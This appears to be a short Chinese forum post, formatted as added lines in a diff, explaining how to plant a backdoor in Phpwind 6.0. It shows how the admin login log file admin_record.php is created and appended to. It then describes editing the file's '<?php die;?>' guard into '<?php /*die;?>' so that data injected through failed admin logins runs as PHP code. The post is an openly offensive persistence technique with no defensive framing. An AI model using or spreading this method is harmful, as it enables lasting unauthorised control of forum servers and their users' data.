@@ -1,0 +1,25 @@
+Phpwind论坛放后门的方式
+
+[Phpwind论坛放后门的方式 全文]pw的一个放后门的方式
+
+data\bbscache\admin_record.php是记录后台登陆和操作的,我们看看是怎么操作这个文件的:
+
+admin\admincp.php:
+ 
+$bbsrecordfile=D_P."data/bbscache/admin_record.php"; 
+if(!file_exists($bbsrecordfile)){ 
+writeover($bbsrecordfile,"<?php die;?>\n"); 
+}//这个if只是说如果不存在admin_record.php 就用代码生成一个 
+
+如果我们只是编辑admin_record.php 把<?php die;?>这个给删除呢 :) 
+
+我们看下我们的代码杂写入admin_record.php的 
+
+你在后台登http://localhost/PHPWind_GBK_6.0RC/upload/admin.php
+随便用个错误的用户登陆 就会有如下记录: 
+
+|admin|s|Logging Failed|127.0.0.1|1191667510| 
+
+呵呵 所以我们可以通过这个写入我们的代码,不过这里是有过滤的 不可以用< 
+
+所以我们的后门应该这样留:<?php die;?> 改为 <?php /*die;?>  
